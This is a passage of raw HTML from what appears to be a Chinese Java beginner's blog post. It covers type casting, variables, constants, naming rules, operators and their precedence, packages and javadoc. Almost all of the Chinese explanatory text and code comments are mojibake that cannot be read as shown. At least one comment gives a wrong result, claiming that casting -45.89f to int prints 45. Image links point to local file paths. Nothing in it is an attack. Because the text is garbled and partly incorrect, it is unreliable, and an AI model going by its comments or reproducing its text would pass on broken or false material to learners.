class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">128</span>;</span><br><span class="line">       <span class="type">byte</span> b=(<span class="type">byte</span>)i;<span class="comment">//å†…å­˜æº¢å‡º</span></span><br><span class="line">       <span class="comment">//å¼ºåˆ¶è½¬æ¢   ï¼ˆç±»å‹ï¼‰å˜é‡å  é«˜--ã€‹ä½</span></span><br><span class="line">       <span class="comment">//è‡ªåŠ¨ç±»å‹è½¬æ¢   ä½--ã€‹é«˜</span></span><br><span class="line">       System.out.println(i);</span><br><span class="line">       System.out.println(b);</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * æ³¨æ„ç‚¹ï¼š</span></span><br><span class="line"><span class="comment">       * 1.ä¸èƒ½å¯¹å¸ƒå°”å‹è¿›è¡Œè½¬æ¢</span></span><br><span class="line"><span class="comment">       * 2.ä¸èƒ½æŠŠå¯¹è±¡ç±»å‹è½¬æ¢ä¸ºä¸ç›¸å¹²çš„ç±»å‹</span></span><br><span class="line"><span class="comment">       * 3.åœ¨æŠŠé«˜å®¹é‡è½¬æ¢åˆ°ä½å®¹é‡çš„æ—¶å€™ï¼Œå¼ºåˆ¶è½¬æ¢</span></span><br><span class="line"><span class="comment">       * 4.è½¬æ¢çš„æ—¶å€™å¯èƒ½å­˜åœ¨å†…å­˜æº¢å‡ºï¼Œæˆ–è€…ç²¾åº¦é—®é¢˜ï¼*/</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)<span class="number">23.7</span>);<span class="comment">//23</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)-<span class="number">45.89f</span>);<span class="comment">//45</span></span><br><span class="line"></span><br><span class="line">       <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">       <span class="type">int</span> d=c+<span class="number">1</span>;</span><br><span class="line">       System.out.println(d);</span><br><span class="line">       System.out.println((<span class="type">char</span>)d);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>javaæ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œæ¯ä¸ªå˜é‡å¿…é¡»å£°æ˜å…¶ç±»å‹</p><p>javaå˜é‡æ˜¯ç¨‹åºä¸­æœ€åŸºæœ¬çš„å­˜å‚¨å•å…ƒï¼Œå…¶è¦æ˜¯åŒ…æ‹¬å˜é‡åï¼Œå˜é‡ç±»å‹å’Œä½œç”¨åŸŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type varName [=value][&#123;,varName[=value]&#125;]</span><br><span class="line">//æ•°æ®ç±»å‹  å˜é‡å=å€¼ï¼›å¯ä»¥ç”¨é€—å·éš”å¼€æ¥å£°æ˜å¤šä¸ªåŒç±»å‹å˜é‡ã€‚</span><br></pre></td></tr></table></figure><p>####æ³¨æ„äº‹é¡¹ï¼š</p><ul><li><p>æ¯ä¸ªå˜é‡éƒ½æœ‰ç±»å‹ï¼Œç±»å‹å¯ä»¥ä½¿åŸºæœ¬å‹ä¹Ÿå¯ä»¥æ˜¯å¼•ç”¨ç±»å‹ã€‚</p></li><li><p>æ¯ä¸ªå˜é‡åå¿…é¡»æ˜¯åˆæ³•æ ‡è¯†ç¬¦</p></li><li><p>å˜é‡å£°æ˜æ˜¯ä¸€æ¡å®Œæ•´çš„è¯­å¥ï¼Œå› æ­¤æ²¡æœ‰ä¸€ä¸ªå£°æ˜éƒ½å¿…é¡»ä»¥åˆ†å·ç»“æŸ</p><p>å˜é‡ä½œç”¨åŸŸï¼š</p><p>ç±»å˜é‡</p><p>å®ä¾‹å˜é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo06</span> &#123;</span><br><span class="line">    <span class="comment">//å±æ€§ï¼šå˜é‡</span></span><br><span class="line">    <span class="comment">//ç±»å˜é‡ static</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span><span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®ä¾‹å˜é‡ï¼šä»å±äºå¯¹è±¡ï¼›å¦‚æœä¸è‡ªè¡Œåˆå§‹åŒ–ï¼Œè¿™ä¸ªç±»å‹é»˜è®¤å€¼ 0   0.0</span></span><br><span class="line">    <span class="comment">//å¸ƒå°”å€¼é»˜è®¤ä¸ºfalse</span></span><br><span class="line">    <span class="comment">//é™¤äº†åŸºæœ¬ç±»å‹ï¼Œå…¶ä½™é»˜è®¤å€¼éƒ½æ˜¯null</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//mainæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//å±€éƒ¨å˜é‡ï¼šå¿…é¡»å£°æ˜å’Œåˆå§‹åŒ–å€¼</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å˜é‡ç±»å‹ å˜é‡åå­—=new demo06</span></span><br><span class="line">        demo06 demo06=<span class="keyword">new</span> <span class="title class_">demo06</span>();</span><br><span class="line">        System.out.println(demo06.age);</span><br><span class="line">        System.out.println(demo06.name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç±»å˜é‡  static</span></span><br><span class="line">        System.out.println(salary);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å…¶ä»–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h3><p>å¸¸é‡ï¼ˆConstantï¼‰ï¼šåˆå§‹åŒ–ï¼ˆinitializeï¼‰åä¸èƒ½å†æ”¹å˜å€¼ï¼ï¼Œä¸ä¼šå˜åŠ¨çš„å€¼</p><p>æ‰€è°“å¸¸é‡å¯ä»¥ç†è§£ä¸ºä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œä»–çš„å€¼è¢«è®¾å®šä»¥åï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¸å…è®¸æ”¹å˜</p><p>final å¸¸é‡å&#x3D;å€¼ï¼›</p><p>final double PI&#x3D;3.14;</p><p>å¸¸é‡åä¸€èˆ¬ä½¿ç”¨å¤§å†™åå­—ç¬¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo07</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> PI=<span class="number">3.14</span>;</span><br><span class="line">    <span class="comment">//static finalä¿®é¥°ç¬¦ï¼Œä¸åˆ†å‰åé¡ºåº</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(PI);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å˜é‡å‘½åè§„èŒƒ"><a href="#å˜é‡å‘½åè§„èŒƒ" class="headerlink" title="å˜é‡å‘½åè§„èŒƒ"></a>å˜é‡å‘½åè§„èŒƒ</h3><p>æ‰€æœ‰å˜é‡ï¼Œæ–¹æ³•ï¼Œé›·åï¼šè§åçŸ¥æ„</p><p>ç±»æˆå‘˜å˜é‡ï¼šé¦–å­—æ¯å°å†™å’Œé©¼å³°åŸåˆ™ï¼šmonthSalary å‡ºäº†ç¬¬ä¸€ä¸ªå­—æ¯ä»¥å¤–åé¢æ¯éš”å­—ç¬¦é¦–å­—æ¯å¤§å†™</p><p>å±€éƒ¨å˜é‡ï¼šé¦–å­—æ¯å°å†™å’Œé©¼å³°åŸåˆ™</p><p>å¸¸é‡ï¼šå¤§å†™å­—æ¯å’Œä¸‹åˆ’çº¿MAX_VALUE</p><p>ç±»åï¼šé¦–å­—æ¯å¤§å†™å’Œé©¼å³°åŸåˆ™</p><p>æ–¹æ³•åï¼šé¦–å­—æ¯å°å†™heé©¼å³°åŸåˆ™</p><h3 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h3><p>ç®—æœ¯è¿ç®—ç¬¦:+ï¼Œ -ï¼Œ*ï¼Œlï¼Œ%ï¼Œ++ï¼Œ â€“</p><p>èµ‹å€¼è¿ç®—ç¬¦&#x3D;<br>å…³ç³»è¿ç®—ç¬¦:&gt;ï¼Œ&lt;ï¼Œ&gt;&#x3D;ï¼Œ&#x3D;ï¼Œ&#x3D;&#x3D;ï¼Œ!&#x3D; instanceof</p><p>é€»è¾‘è¿ç®—ç¬¦: &amp;&amp;ï¼Œ||ï¼Œ!<br>ä½è¿ç®—ç¬¦:&amp;ï¼Œ|ï¼Œ^ï¼Œ~ï¼Œ&gt;&gt;ï¼Œ&lt;&lt;ï¼Œ&gt;&gt;&gt;(äº†è§£! ! ! )æ¡ä»¶è¿ç®—ç¬¦?ï¸°<br>æ‰©å±•èµ‹å€¼è¿ç®—ç¬¦:+&#x3D;ï¼Œ-&#x3D;ï¼Œ*&#x3D;ï¼Œ&#x2F;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo01 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=20;</span><br><span class="line">        int c=25;</span><br><span class="line">        int d=25;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(a-b);</span><br><span class="line">        System.out.println(a*b);</span><br><span class="line">        System.out.println(a/(double)b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo02 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        long a=123124151123L;</span><br><span class="line">        int b=123;</span><br><span class="line">        short c= 10;</span><br><span class="line">        byte d=8;</span><br><span class="line">        System.out.println(a+b+c+d);//long</span><br><span class="line">        System.out.println(b+c+d);//int</span><br><span class="line">        System.out.println(c+d);//int</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo03 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //å…³ç³»è¿ç®—ç¬¦è¿”å›çš„ç»“æœï¼š æ­£ç¡® é”™è¯¯  å¸ƒå°”å€¼</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=2;</span><br><span class="line">        int c=21;</span><br><span class="line">        System.out.println(c%a);</span><br><span class="line">        System.out.println(a&gt;b);</span><br><span class="line">        System.out.println(a&lt;b);</span><br><span class="line">        System.out.println(a==b);</span><br><span class="line">        System.out.println(a!=b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è‡ªå¢è¿ç®—ç¬¦"><a href="#è‡ªå¢è¿ç®—ç¬¦" class="headerlink" title="è‡ªå¢è¿ç®—ç¬¦"></a>è‡ªå¢è¿ç®—ç¬¦</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.ls.LSOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//++  --   è‡ªå¢  è‡ªå‡  ä¸€å…ƒè¿ç®—ç¬¦</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> b=a++;<span class="comment">//æ‰§è¡Œå®Œè¿™è¡Œä»£ç åï¼Œå…ˆç»™bèµ‹å€¼ï¼Œåœ¨è‡ªå¢</span></span><br><span class="line">        <span class="comment">//a=a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span>++a;<span class="comment">//æ‰§è¡Œè¿™æ®µä»£ç ï¼Œå…ˆè‡ªå¢ï¼Œå†ç»™bèµ‹å€¼</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        <span class="comment">//å¹‚è¿ç®—  2^3  è¿ç”¨Mathç±»å·¥å…·</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * A=0011 1100</span></span><br><span class="line"><span class="comment">        * B=0000 1101</span></span><br><span class="line"><span class="comment">        * A&amp;B=0000 1100</span></span><br><span class="line"><span class="comment">        * A|b=0011 1101</span></span><br><span class="line"><span class="comment">        * A^B=0011 0010</span></span><br><span class="line"><span class="comment">        * ~B=111 0010</span></span><br><span class="line"><span class="comment">        *2*8=16 2*2*2*2</span></span><br><span class="line"><span class="comment">        *&lt;&lt; *2   &gt;&gt; /2</span></span><br><span class="line"><span class="comment">        * ä½è¿ç®—  æ•ˆç‡é«˜ï¼ï¼ï¼</span></span><br><span class="line"><span class="comment">        0000 0000  0</span></span><br><span class="line"><span class="comment">        0000 0001  1</span></span><br><span class="line"><span class="comment">        0000 0010  2</span></span><br><span class="line"><span class="comment">        0000 0100  4</span></span><br><span class="line"><span class="comment">        0000 1000  8</span></span><br><span class="line"><span class="comment">        0001 0000  16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        System.out.println(<span class="number">2</span>&lt;&lt;<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸‰å…ƒè¿ç®—ç¬¦"><a href="#ä¸‰å…ƒè¿ç®—ç¬¦" class="headerlink" title="ä¸‰å…ƒè¿ç®—ç¬¦"></a>ä¸‰å…ƒè¿ç®—ç¬¦</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">20</span>;</span><br><span class="line">        a+=b;<span class="comment">//a=a+b</span></span><br><span class="line">        a-=b;<span class="comment">//a=a-b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//å­—ç¬¦ä¸²è¿æ¥ç¬¦ +  String</span></span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+a+b);</span><br><span class="line">        System.out.println(a+b+<span class="string">&quot;&quot;</span>);<span class="comment">//å…ˆè¿ç®—åŠ åœ¨å’Œå­—ç¬¦ä¸²ç›¸åŠ </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//x?y:z</span></span><br><span class="line">        <span class="comment">//å¦‚æœx==true ï¼Œåˆ™ç»“æœä¸ºyï¼Œå¦åˆ™ç»“æœä¸ºz</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">80</span>;</span><br><span class="line">        String type=score&lt;<span class="number">60</span>?<span class="string">&quot;ä¸åŠæ ¼&quot;</span>:<span class="string">&quot;åŠæ ¼&quot;</span>;</span><br><span class="line">        System.out.println(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿ç®—ä¼˜å…ˆçº§"><a href="#è¿ç®—ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ä¼˜å…ˆçº§"></a>è¿ç®—ä¼˜å…ˆçº§</h4><table><thead><tr><th>ç±»åˆ«</th><th>æ“ä½œç¬¦</th><th>å…³è”æ€§</th></tr></thead><tbody><tr><td>åç¼€</td><td>() [] . (ç‚¹æ“ä½œç¬¦)</td><td>å·¦åˆ°å³</td></tr><tr><td>ä¸€å…ƒ</td><td>expr++  exprâ€“</td><td>ä»å·¦åˆ°å³</td></tr><tr><td>ä¸€å…ƒ</td><td>++expr â€“expr + - ï½ ï¼</td><td>ä»å³åˆ°å·¦</td></tr><tr><td>ä¹˜æ€§</td><td>* &#x2F;ï¼…</td><td>å·¦åˆ°å³</td></tr><tr><td>åŠ æ€§</td><td>+ -</td><td>å·¦åˆ°å³</td></tr><tr><td>ç§»ä½</td><td>&gt;&gt; &gt;&gt;&gt;  &lt;&lt;</td><td>å·¦åˆ°å³</td></tr><tr><td>å…³ç³»</td><td>&gt;  &gt;&#x3D;  &lt;  &lt;&#x3D;</td><td>å·¦åˆ°å³</td></tr><tr><td>ç›¸ç­‰</td><td>&#x3D;&#x3D; !&#x3D;</td><td>å·¦åˆ°å³</td></tr><tr><td>æŒ‰ä½ä¸</td><td>ï¼†</td><td>å·¦åˆ°å³</td></tr><tr><td>æŒ‰ä½å¼‚æˆ–</td><td>^</td><td>å·¦åˆ°å³</td></tr><tr><td>æŒ‰ä½æˆ–</td><td>|</td><td>å·¦åˆ°å³</td></tr><tr><td>é€»è¾‘ä¸</td><td>&amp;&amp;</td><td>å·¦åˆ°å³</td></tr><tr><td>é€»è¾‘æˆ–</td><td>| |</td><td>å·¦åˆ°å³</td></tr><tr><td>æ¡ä»¶</td><td>ï¼Ÿï¼š</td><td>ä»å³åˆ°å·¦</td></tr><tr><td>èµ‹å€¼</td><td>&#x3D; + &#x3D; - &#x3D; * &#x3D; &#x2F; &#x3D;ï¼…&#x3D; &gt;&gt; &#x3D; &lt;&lt; &#x3D;ï¼†&#x3D; ^ &#x3D; | &#x3D;</td><td>ä»å³åˆ°å·¦</td></tr><tr><td>é€—å·</td><td>ï¼Œ</td><td>å·¦åˆ°å³</td></tr></tbody></table><h3 id="åŒ…æœºåˆ¶"><a href="#åŒ…æœºåˆ¶" class="headerlink" title="åŒ…æœºåˆ¶"></a>åŒ…æœºåˆ¶</h3><p>ä¸ºäº†æ›´å¥½çš„ç»„ç»‡ç±»ï¼Œjavaæä¾›äº†åŒ…æœºåˆ¶ï¼Œç”¨äºåŒºåˆ«ç±»åçš„å‘½åç©ºé—´ã€‚</p><p>åŒ…è¯­å¥çš„è¯­æ³•æ ¼å¼ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[.pkg2[.pkg3...]];</span><br></pre></td></tr></table></figure><p>ä¸€ç­åˆ©ç”¨å…¬å¸åŸŸåå€’ç½®ä½œä¸ºåŒ…åï¼›</p><p>ä¸ºäº†èƒ½å¤Ÿä½¿ç”¨æŸä¸€ä¸ªåŒ…çš„æˆå‘˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨javaç¨‹åºä¸­æ˜ç¡®å¯¼å…¥è¯¥åŒ…ã€‚ä½¿ç”¨â€œimportâ€å®Œæˆæ­¤åŠŸèƒ½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">package</span>[.package2...].(ckassname|*);</span><br></pre></td></tr></table></figure><p>åŒ…å°±åƒæ–‡ä»¶å¤¹ä¸€æ ·</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230822160255214-1698627034979-7-1700990364418-196-1700994560237-171.png"></p><h3 id="javaDoc"><a href="#javaDoc" class="headerlink" title="javaDoc"></a>javaDoc</h3><p>javaDocå‘½ä»¤æ˜¯ç”¨æ¥ç”Ÿæˆè‡ªå·±Apiæ–‡æ¡£çš„</p><h4 id="å‘½ä»¤è¡Œç”Ÿæˆjavadocæ–‡æ¡£"><a href="#å‘½ä»¤è¡Œç”Ÿæˆjavadocæ–‡æ¡£" class="headerlink" title="å‘½ä»¤è¡Œç”Ÿæˆjavadocæ–‡æ¡£"></a>å‘½ä»¤è¡Œç”Ÿæˆjavadocæ–‡æ¡£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> Demo.java</span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164523717.png"></p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164535066.png"></p><p>ç‚¹å¼€index.html</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164554989.png"></p><h4 id="IDEAç”Ÿæˆjavadocæ–‡æ¡£"><a href="#IDEAç”Ÿæˆjavadocæ–‡æ¡£" class="headerlink" title="IDEAç”Ÿæˆjavadocæ–‡æ¡£"></a>IDEAç”Ÿæˆjavadocæ–‡æ¡£</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192435394.png"></p><p><img 